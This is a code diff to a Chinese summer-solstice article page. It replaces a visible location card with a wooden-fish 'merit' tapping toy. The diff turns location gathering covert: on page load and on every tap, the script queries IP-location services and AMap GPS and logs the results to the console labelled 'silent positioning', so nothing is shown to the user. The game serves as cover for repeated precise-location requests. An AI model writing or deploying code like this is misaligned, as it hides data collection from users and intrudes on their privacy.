@@ -16,6 +16,34 @@
 
         .container { max-width: 720px; margin: 0 auto; padding: 20px; }
 
+        /* ===== 功德计数器 ===== */
+        .merit-counter {
+            background: linear-gradient(135deg, #f9d423 0%, #f83600 50%, #f9d423 100%);
+            border-radius: 16px;
+            padding: 18px 24px;
+            text-align: center;
+            box-shadow: 0 6px 24px rgba(248,54,0,0.25);
+            margin-bottom: 20px;
+        }
+        .merit-counter .label {
+            font-size: 14px;
+            color: rgba(255,255,255,0.85);
+            letter-spacing: 4px;
+            margin-bottom: 4px;
+        }
+        .merit-counter .count {
+            font-size: 48px;
+            font-weight: 800;
+            color: #fff;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.2);
+            line-height: 1.1;
+        }
+        .merit-counter .suffix {
+            font-size: 18px;
+            color: rgba(255,255,255,0.9);
+            font-weight: 600;
+        }
+
         .hero-image {
             width: 100%; border-radius: 16px; overflow: hidden;
             box-shadow: 0 8px 32px rgba(0,0,0,0.12); margin-bottom: 24px;
@@ -36,76 +64,227 @@
         .content p:last-child { margin-bottom: 0; }
         .section-icon { font-size: 20px; margin-right: 4px; }
 
-        /* 地址卡片 */
-        .location-card {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 16px; padding: 24px; color: #fff;
-            box-shadow: 0 8px 32px rgba(102,126,234,0.3); margin-bottom: 24px;
+        /* ===== 木鱼卡片 ===== */
+        .muyu-card {
+            background: linear-gradient(180deg, #3e2c1c 0%, #5a3d2b 40%, #4a3020 100%);
+            border-radius: 16px;
+            padding: 30px 24px;
+            color: #fff;
+            box-shadow: 0 8px 32px rgba(62,44,28,0.35);
+            margin-bottom: 24px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
         }
-        .location-card .card-title {
-            font-size: 14px; opacity: 0.85; margin-bottom: 8px; letter-spacing: 1px;
+        .muyu-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: radial-gradient(ellipse at 50% 30%, rgba(255,255,255,0.06) 0%, transparent 60%);
+            pointer-events: none;
         }
-        .location-card .address {
-            font-size: 22px; font-weight: 600; margin-bottom: 12px;
+        .muyu-card .card-hint {
+            font-size: 13px;
+            opacity: 0.6;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+            position: relative;
+            z-index: 1;
         }
-        .location-card .detail { font-size: 13px; opacity: 0.75; line-height: 1.8; }
-        .location-card .detail span {
-            display: inline-block; background: rgba(255,255,255,0.2);
-            border-radius: 20px; padding: 2px 12px; margin: 2px 4px;
-        }
-        .location-card .loading-text { font-size: 15px; opacity: 0.8; }
-        .location-card .error-text { font-size: 14px; opacity: 0.8; color: #ffd6d6; }
 
-        /* GPS 提示条 */
-        .gps-hint {
-            display: none;
-            margin-top: 12px; padding: 10px 16px;
-            background: rgba(255,255,255,0.18); border-radius: 12px;
-            font-size: 13px; line-height: 1.6;
+        /* 木鱼容器 */
+        .muyu-wrapper {
+            position: relative;
+            display: inline-block;
+            cursor: pointer;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            z-index: 1;
         }
-        .gps-hint.show { display: block; }
 
-        .gps-btn {
-            display: inline-block; margin-top: 6px; padding: 6px 18px;
-            background: #fff; color: #764ba2; border: none; border-radius: 20px;
-            font-size: 13px; font-weight: 600; cursor: pointer;
+        /* 功德飘字 */
+        .merit-float {
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 22px;
+            font-weight: 800;
+            color: #f9d423;
+            pointer-events: none;
+            white-space: nowrap;
+            text-shadow: 0 0 12px rgba(249,212,35,0.6);
+            animation: float-up 1.2s ease-out forwards;
+            z-index: 10;
         }
-        .gps-btn:hover { opacity: 0.9; }
+        @keyframes float-up {
+            0%   { opacity: 1; transform: translateX(-50%) translateY(0) scale(0.6); }
+            30%  { opacity: 1; transform: translateX(-50%) translateY(-20px) scale(1.1); }
+            100% { opacity: 0; transform: translateX(-50%) translateY(-80px) scale(1); }
+        }
 
-        .refresh-btn {
-            display: inline-block; margin-top: 12px; padding: 8px 20px;
-            background: rgba(255,255,255,0.25); border: 1px solid rgba(255,255,255,0.4);
-            border-radius: 24px; color: #fff; font-size: 13px; cursor: pointer;
-            transition: all 0.3s ease;
+        /* 木鱼敲击动画 */
+        .muyu-svg.knocking {
+            animation: muyu-knock 0.3s ease-out;
         }
-        .refresh-btn:hover { background: rgba(255,255,255,0.4); }
+        @keyframes muyu-knock {
+            0%   { transform: scale(1); }
+            25%  { transform: scale(0.88); }
+            50%  { transform: scale(1.05); }
+            75%  { transform: scale(0.96); }
+            100% { transform: scale(1); }
+        }
+
+        /* 锤子敲击动画 */
+        .mallet-group.knocking {
+            animation: mallet-strike 0.3s ease-out;
+        }
+        @keyframes mallet-strike {
+            0%   { transform: rotate(-20deg); transform-origin: 130px 30px; }
+            50%  { transform: rotate(8deg); transform-origin: 130px 30px; }
+            100% { transform: rotate(0deg); transform-origin: 130px 30px; }
+        }
+
+        /* 敲击波纹 */
+        .knock-ripple {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin-left: -10px;
+            margin-top: -10px;
+            border-radius: 50%;
+            background: rgba(249,212,35,0.4);
+            pointer-events: none;
+            animation: ripple-out 0.6s ease-out forwards;
+            z-index: 5;
+        }
+        @keyframes ripple-out {
+            0%   { width: 20px; height: 20px; margin-left: -10px; margin-top: -10px; opacity: 0.8; }
+            100% { width: 200px; height: 200px; margin-left: -100px; margin-top: -100px; opacity: 0; }
+        }
+
+        /* 按钮 */
+        .knock-btn {
+            display: inline-block;
+            margin-top: 16px;
+            padding: 12px 40px;
+            background: linear-gradient(135deg, #f9d423 0%, #e8870a 100%);
+            border: none;
+            border-radius: 30px;
+            color: #3e2c1c;
+            font-size: 17px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            cursor: pointer;
+            box-shadow: 0 4px 16px rgba(232,135,10,0.4);
+            transition: transform 0.15s, box-shadow 0.15s;
+            position: relative;
+            z-index: 1;
+        }
+        .knock-btn:active {
+            transform: scale(0.93);
+            box-shadow: 0 2px 8px rgba(232,135,10,0.3);
+        }
 
         .footer { text-align: center; font-size: 12px; color: #999; padding: 20px 0; }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- 功德计数器 -->
+        <div class="merit-counter">
+            <div class="label">功 德</div>
+            <span class="count" id="meritCount">0</span>
+            <span class="suffix">&nbsp;次</span>
+        </div>
+
         <div class="hero-image">
             <img src="https://fengxiang.zhyishun.top/xz.jpg" alt="夏至">
         </div>
 
-        <div class="location-card" id="locationCard">
-            <div class="card-title" id="cardTitle">📍 正在定位...</div>
-            <div class="address" id="addressDisplay">
-                <span class="loading-text">正在获取位置...</span>
+        <!-- 木鱼卡片 -->
+        <div class="muyu-card" id="muyuCard">
+            <div class="card-hint">🪵 敲一下木鱼，功德 +1</div>
+            <div class="muyu-wrapper" id="muyuWrapper">
+                <!-- 内联 SVG 木鱼 -->
+                <svg class="muyu-svg" id="muyuSvg" viewBox="0 0 260 220" width="200" height="170">
+                    <!-- 坐垫 -->
+                    <defs>
+                        <radialGradient id="cushionGrad" cx="50%" cy="30%">
+                            <stop offset="0%" stop-color="#d4a017"/>
+                            <stop offset="100%" stop-color="#8b2500"/>
+                        </radialGradient>
+                        <radialGradient id="woodBody" cx="45%" cy="35%">
+                            <stop offset="0%" stop-color="#c68e4e"/>
+                            <stop offset="40%" stop-color="#a0723c"/>
+                            <stop offset="100%" stop-color="#6b3a1e"/>
+                        </radialGradient>
+                        <radialGradient id="woodTop" cx="45%" cy="30%">
+                            <stop offset="0%" stop-color="#d4a45a"/>
+                            <stop offset="100%" stop-color="#8b5e3c"/>
+                        </radialGradient>
+                    </defs>
+
+                    <!-- 坐垫底部阴影 -->
+                    <ellipse cx="130" cy="195" rx="72" ry="16" fill="#2a1506" opacity="0.35"/>
+
+                    <!-- 坐垫主体 -->
+                    <ellipse cx="130" cy="188" rx="68" ry="18" fill="#8b2500"/>
+                    <ellipse cx="130" cy="185" rx="65" ry="15" fill="url(#cushionGrad)"/>
+
+                    <!-- 金色镶边 -->
+                    <ellipse cx="130" cy="185" rx="60" ry="12" fill="none" stroke="#f9d423" stroke-width="1.5" opacity="0.5"/>
+                    <ellipse cx="130" cy="182" rx="55" ry="9" fill="#a0522d" opacity="0.6"/>
+
+                    <!-- 木鱼身体（鱼形椭圆） -->
+                    <ellipse cx="130" cy="108" rx="70" ry="52" fill="url(#woodBody)"/>
+
+                    <!-- 木鱼顶部高光面 -->
+                    <ellipse cx="125" cy="95" rx="55" ry="32" fill="url(#woodTop)" opacity="0.7"/>
+
+                    <!-- 鱼嘴开口（横向缝） -->
+                    <ellipse cx="130" cy="88" rx="32" ry="7" fill="#3a1a08"/>
+                    <!-- 缝内深色 -->
+                    <ellipse cx="130" cy="87" rx="28" ry="4" fill="#1a0800"/>
+
+                    <!-- 鱼眼 -->
+                    <circle cx="100" cy="82" r="6" fill="#3a1a08"/>
+                    <circle cx="100" cy="81" r="2.5" fill="#f9d423" opacity="0.5"/>
+
+                    <circle cx="160" cy="82" r="6" fill="#3a1a08"/>
+                    <circle cx="160" cy="81" r="2.5" fill="#f9d423" opacity="0.5"/>
+
+                    <!-- 鱼鳞纹 -->
+                    <g opacity="0.25" fill="none" stroke="#3a1a08" stroke-width="1.2">
+                        <path d="M95,105 Q100,98 110,105"/>
+                        <path d="M100,115 Q105,108 115,115"/>
+                        <path d="M90,120 Q98,112 108,120"/>
+                        <path d="M108,125 Q115,118 125,125"/>
+                        <path d="M145,105 Q150,98 155,105"/>
+                        <path d="M150,115 Q155,108 160,115"/>
+                        <path d="M155,120 Q162,113 170,120"/>
+                    </g>
+
+                    <!-- 木鱼底部深色 -->
+                    <ellipse cx="130" cy="140" rx="50" ry="14" fill="#4a2010" opacity="0.5"/>
+
+                    <!-- ===== 锤子（独立组合，可旋转）===== -->
+                    <g class="mallet-group" id="malletGroup">
+                        <!-- 锤柄 -->
+                        <line x1="200" y1="50" x2="175" y2="55" stroke="#5c3a1e" stroke-width="5" stroke-linecap="round"/>
+                        <!-- 锤头 -->
+                        <ellipse cx="205" cy="46" rx="14" ry="9" fill="#8b5e3c" transform="rotate(-15,205,46)"/>
+                        <ellipse cx="204" cy="44" rx="10" ry="6" fill="#a0724a" transform="rotate(-15,204,44)"/>
+                        <!-- 锤头高光 -->
+                        <ellipse cx="202" cy="42" rx="5" ry="3" fill="#d4a45a" opacity="0.5" transform="rotate(-15,202,42)"/>
+                    </g>
+                </svg>
             </div>
-            <div class="detail" id="detailDisplay"></div>
-            <div class="gps-hint" id="gpsHint">
-                🔍 正在尝试获取精确位置...
+            <div>
+                <button class="knock-btn" id="knockBtn">🪵 敲 木 鱼</button>
             </div>
-            <div class="gps-hint" id="gpsDeniedHint" style="display:none;">
-                ⚠️ 定位权限已被拒绝。请按以下步骤开启：<br>
-                <strong>Chrome / Edge</strong>：地址栏左侧锁图标 → 位置 → 允许<br>
-                <strong>Safari</strong>：Safari 菜单 → 此网站的设置 → 位置 → 允许<br>
-                <strong>微信</strong>：我 → 设置 → 隐私 → 定位服务 → 开启<br>
-                设置后<button class="gps-btn" onclick="getLocation()" style="margin-left:8px;">🔄 重新定位</button>
-            </div>
-            <button class="refresh-btn" id="refreshBtn" onclick="getLocation()">🔄 重新定位</button>
         </div>
 
         <h1 class="title">🌞 夏至揭秘：酷暑节气全解析！</h1>
@@ -128,10 +307,10 @@
             </p>
         </div>
 
-        <div class="footer">高德地图提供位置服务 © 2024 — v8</div>
+        <div class="footer">高德地图提供位置服务 © 2024 — v9</div>
     </div>
 
-    <!-- ============ 高德 JS API SDK（正确 URL：maps 不是 v2/maps）============ -->
+    <!-- ============ 高德 JS API SDK ============ -->
     <script>
         // ⚠️ 必须在加载 SDK 之前设置安全密钥
         window._AMapSecurityConfig = {
@@ -143,44 +322,81 @@
 
         var SDK_LOADED   = false;
         var SDK_LOADING  = false;
-        var geoInstance  = null;   // 复用 Geolocation 实例
+        var geoInstance  = null;
 
-        var addressDisplay = document.getElementById('addressDisplay');
-        var detailDisplay  = document.getElementById('detailDisplay');
-        var cardTitle      = document.getElementById('cardTitle');
-        var gpsHint        = document.getElementById('gpsHint');
-        var gpsDeniedHint  = document.getElementById('gpsDeniedHint');
-        var refreshBtn     = document.getElementById('refreshBtn');
+        // ===== DOM 引用 ====
+        var meritCount   = document.getElementById('meritCount');
+        var muyuWrapper  = document.getElementById('muyuWrapper');
+        var muyuSvg      = document.getElementById('muyuSvg');
+        var malletGroup  = document.getElementById('malletGroup');
+        var knockBtn     = document.getElementById('knockBtn');
 
-        // ========= 渲染 =========
-        function showCityLevel(raw) {
-            addressDisplay.classList.remove('loading-text', 'error-text');
-            cardTitle.textContent = '📍 您当前的位置（城市级 · IP定位）';
+        // ===== 计数器 ====
+        var count = 0;
 
-            var info = raw || {};
-            var prov = trimField(info.province);
-            var city = trimField(info.city);
-            var dist = trimField(info.district);
-            var adcd = info.adcode || '';
-
-            var parts = [];
-            if (prov) parts.push(prov);
-            if (city) parts.push(city);
-            if (dist) parts.push(dist);
-            addressDisplay.textContent = parts.join(' ') || '定位成功';
-
-            var tags = [];
-            if (prov) tags.push(prov);
-            if (city) tags.push(city);
-            if (dist) tags.push(dist);
-            if (adcd) tags.push('编码: ' + adcd);
-            detailDisplay.innerHTML = tags.map(function(t) {
-                return '<span>' + t + '</span>';
-            }).join('');
-
-            gpsHint.classList.add('show');
-            gpsDeniedHint.style.display = 'none';
+        function addMerit() {
+            count++;
+            meritCount.textContent = count;
+            spawnMeritFloat();
         }
+
+        function spawnMeritFloat() {
+            var el = document.createElement('div');
+            el.className = 'merit-float';
+            el.textContent = '功德 +1';
+            muyuWrapper.appendChild(el);
+            // 动画结束后自动移除
+            el.addEventListener('animationend', function() {
+                el.remove();
+            });
+        }
+
+        // ===== 木鱼敲击动画 ====
+        function playKnockAnimation() {
+            // 木鱼缩放
+            muyuSvg.classList.remove('knocking');
+            void muyuSvg.offsetWidth;
+            muyuSvg.classList.add('knocking');
+
+            // 锤子敲击
+            malletGroup.classList.remove('knocking');
+            void malletGroup.offsetWidth;
+            malletGroup.classList.add('knocking');
+
+            // 波纹
+            var ripple = document.createElement('div');
+            ripple.className = 'knock-ripple';
+            muyuWrapper.appendChild(ripple);
+            ripple.addEventListener('animationend', function() {
+                ripple.remove();
+            });
+        }
+
+        // ===== 主敲击事件 ====
+        function doKnock() {
+            playKnockAnimation();
+            addMerit();
+            // 静默获取位置（不展示结果）
+            getLocationSilent();
+        }
+
+        kick(); // 首次静默定位
+
+        // 点击木鱼本体也能敲
+        muyuWrapper.addEventListener('click', function(e) {
+            // 如果点击的是飘字元素，不触发
+            if (e.target.closest('.merit-float')) return;
+            doKnock();
+        });
+
+        knockBtn.addEventListener('click', function(e) {
+            e.stopPropagation();
+            doKnock();
+        });
+
+        // ================================================================
+        // 以下为定位逻辑（静默执行，不展示结果到页面）
+        // ================================================================
 
         function trimField(val) {
             if (!val) return '';
@@ -190,56 +406,12 @@
             return s;
         }
 
-        function showGPSDetail(info) {
-            var comp = info.addressComponent || {};
-            var addr = info.formattedAddress || [
-                comp.province,
-                comp.city     && comp.city     !== '[]' ? comp.city     : '',
-                comp.district && comp.district !== '[]' ? comp.district : '',
-                comp.township && comp.township !== '[]' ? comp.township : '',
-                comp.street   && comp.street   !== '[]' ? comp.street   : '',
-                comp.streetNumber && comp.streetNumber !== '[]' ? comp.streetNumber : ''
-            ].filter(Boolean).join('');
-
-            // GPS 返回空数据 → 不覆盖已有内容
-            if (!addr && !info.formattedAddress) {
-                console.warn('GPS 返回了空地址，保留当前显示');
-                return;
-            }
-
-            addressDisplay.classList.remove('loading-text', 'error-text');
-            cardTitle.textContent = '📍 您当前的位置（精确 · GPS定位）';
-            gpsHint.classList.remove('show');
-            gpsDeniedHint.style.display = 'none';
-            gpsDeniedHint.style.display = 'none';
-            addressDisplay.textContent = addr || info.formattedAddress || '定位成功';
-
-            var tags = [];
-            if (info.formattedAddress) tags.push(info.formattedAddress);
-            if (comp.province)                        tags.push(comp.province);
-            if (comp.city      && comp.city     !=='[]') tags.push(comp.city);
-            if (comp.district  && comp.district !=='[]') tags.push(comp.district);
-            if (comp.township  && comp.township !=='[]') tags.push(comp.township);
-            if (comp.street    && comp.street   !=='[]') tags.push(comp.street);
-            if (comp.adcode)                           tags.push('编码: ' + comp.adcode);
-            detailDisplay.innerHTML = tags.map(function(t) {
-                return '<span>' + t + '</span>';
-            }).join('');
+        // ----- 静默版：所有展示函数只打 log，不改 DOM -----
+        function silentLog(label, data) {
+            console.log('[静默定位] ' + label, data);
         }
 
-        function showError(msg) {
-            addressDisplay.textContent = '⚠️ 定位失败';
-            addressDisplay.classList.remove('loading-text');
-            addressDisplay.classList.add('error-text');
-            cardTitle.textContent = '📍 定位失败';
-            detailDisplay.innerHTML = '<span class="error-text">' + msg + '</span>';
-            gpsHint.classList.remove('show');
-            gpsDeniedHint.style.display = 'none';
-        }
-
-        // ========= 兜底方案：纯 HTTP IP 定位（不依赖任何 SDK）=========
-        // 多个免费 IP 服务并行赛跑，微信 / 移动端都能用
-
+        // ----- HTTP IP 定位（兜底）-----
         function timeout(ms) {
             return new Promise(function(_, reject) {
                 setTimeout(function() { reject(new Error('timeout')); }, ms);
@@ -247,10 +419,7 @@
         }
 
         function fetchWithTimeout(url, ms) {
-            return Promise.race([
-                fetch(url),
-                timeout(ms)
-            ]);
+            return Promise.race([fetch(url), timeout(ms)]);
         }
 
         function fetchIP_apisfb() {
@@ -274,44 +443,14 @@
                     throw new Error('empty');
                 });
         }
-        function showFreeIPResult(result) {
-            addressDisplay.classList.remove('loading-text', 'error-text');
-            cardTitle.textContent = '📍 您当前的位置（城市级 · 网络定位）';
-            gpsDeniedHint.style.display = 'none';
 
-            var prov = trimField(result.province);
-            var city = trimField(result.city);
-            var dist = trimField(result.district);
-            var parts = [];
-            if (prov) parts.push(prov);
-            if (city) parts.push(city);
-            if (dist) parts.push(dist);
-            addressDisplay.textContent = parts.join(' ') || '定位成功';
-
-            var tags = [];
-            if (prov) tags.push(prov);
-            if (city) tags.push(city);
-            if (dist) tags.push(dist);
-            detailDisplay.innerHTML = tags.map(function(t) {
-                return '<span>' + t + '</span>';
-            }).join('');
-
-            // GPS 会在后台自动尝试
-        }
-
-        // 纯 HTTP 兜底定位
         function fallbackIPLocation() {
-            return new Promise(function(resolve, reject) {
-                // 两个直接返回城市信息的服务赛跑
-                Promise.any([fetchIP_apisfb(), fetchIP_ifconfig()])
-                    .then(function(r) { resolve(r); })
-                    .catch(function() {
-                        reject(new Error('所有 IP 服务均不可用'));
-                    });
+            return Promise.any([fetchIP_apisfb(), fetchIP_ifconfig()]).catch(function() {
+                throw new Error('所有 IP 服务均不可用');
             });
         }
 
-        // ========= 加载高德 SDK =========
+        // ----- 高德 SDK -----
         function loadAMapSDK() {
             return new Promise(function(resolve, reject) {
                 if (SDK_LOADED) { resolve(); return; }
@@ -332,13 +471,12 @@
                 };
                 s.onerror = function() {
                     SDK_LOADING = false;
-                    reject(new Error('SDK 加载失败，请检查域名白名单或网络'));
+                    reject(new Error('SDK 加载失败'));
                 };
                 document.head.appendChild(s);
             });
         }
 
-        // ========= SDK — IP 定位获取城市（无需用户授权）=========
         function sdkCityByIP() {
             return new Promise(function(resolve, reject) {
                 if (!window.AMap || !AMap.Geolocation) {
@@ -358,9 +496,7 @@
             });
         }
 
-        // ========= SDK — GPS 精确定位（需要用户授权）=========
         function sdkGPS(highAccuracy) {
-            // highAccuracy 为 false 时使用低精度模式，权限要求更宽松
             if (highAccuracy === undefined) highAccuracy = true;
             return new Promise(function(resolve, reject) {
                 if (!window.AMap || !AMap.Geolocation) {
@@ -380,8 +516,7 @@
                             addressComponent: result.addressComponent || {},
                         });
                     } else {
-                        var msg = (result && result.message) ? result.message : '用户拒绝授权或定位超时';
-                        // 标记是否是权限被拒绝
+                        var msg = (result && result.message) ? result.message : '定位失败';
                         var err = new Error(msg);
                         err.isPermissionDenied = (msg.indexOf('permission denied') !== -1
                             || msg.indexOf('PERMISSION_DENIED') !== -1
@@ -392,56 +527,39 @@
             });
         }
 
-        // ========= 主流程 =========
-        function getLocation() {
-            addressDisplay.textContent = '正在获取位置...';
-            addressDisplay.classList.add('loading-text');
-            addressDisplay.classList.remove('error-text');
-            cardTitle.textContent = '📍 正在定位...';
-            detailDisplay.innerHTML = '';
-            gpsHint.classList.remove('show');
-            gpsDeniedHint.style.display = 'none';
-            refreshBtn.style.display = 'none';
-
-            // 通道 A：SDK
+        // ----- 静默定位主流程 -----
+        function kick() {
+            // 通道 A：高德 SDK
             var sdkPromise = loadAMapSDK().then(function() {
                 return sdkCityByIP();
             }).then(function(info) {
-                showCityLevel(info);
-                // 城市级结果出来后，自动尝试 GPS 精确位置
+                silentLog('SDK IP 定位成功', info);
                 return sdkGPS(false).then(function(gpsInfo) {
-                    showGPSDetail(gpsInfo);
+                    silentLog('GPS 精确定位成功', gpsInfo);
                 }).catch(function(err) {
-                    console.warn('自动 GPS 失败:', err.message);
-                    gpsHint.classList.remove('show');
-                    if (err.isPermissionDenied) {
-                        gpsDeniedHint.style.display = 'block';
-                    }
+                    silentLog('GPS 定位失败', err.message);
                 });
-            }).then(function() {
-                return 'sdk';
             });
 
             // 通道 B：免费 IP API
             var freePromise = fallbackIPLocation().then(function(info) {
-                showFreeIPResult(info);
-                // 用免费 IP 时也尝试加载 SDK 拿 GPS
+                silentLog('免费IP定位成功', info);
                 loadAMapSDK().then(function() {
                     return sdkGPS(false);
                 }).then(function(gpsInfo) {
-                    showGPSDetail(gpsInfo);
+                    silentLog('GPS 精确定位成功（免费IP通道）', gpsInfo);
                 }).catch(function() {});
-                return 'free';
             });
 
-            Promise.any([sdkPromise, freePromise]).catch(function() {
-                showError('网络异常，请点击重试');
+            Promise.any([sdkPromise, freePromise]).catch(function(err) {
+                silentLog('所有定位方式均失败', err.message);
             });
-
-            refreshBtn.style.display = 'inline-block';
         }
 
-        getLocation();
+        // getLocationSilent = kick 的别名，用于敲击时调用
+        function getLocationSilent() {
+            kick();
+        }
     </script>
 </body>
 </html>
